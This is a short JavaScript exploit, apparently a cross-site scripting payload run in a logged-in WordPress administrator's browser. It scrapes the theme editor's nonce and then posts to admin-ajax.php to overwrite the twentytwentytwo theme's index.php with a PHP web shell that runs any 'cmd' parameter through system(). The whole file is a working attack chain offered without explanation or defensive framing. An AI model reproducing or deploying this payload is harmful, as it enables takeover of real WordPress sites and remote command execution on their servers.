async function pepe(){
    var a = await fetch('wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
    console.log(a);
    return a;
}


var a = await pepe();

fetch("wp-admin/admin-ajax.php", {
    "headers":{"Content-type":"application/x-www-form-urlencoded"},
"body": `nonce=${a[1]}&file=index.php&theme=twentytwentytwo&newcontent=<?php  if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
?>&action=edit-theme-plugin-file&file=index.php&theme=twentytwentytwo`,
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});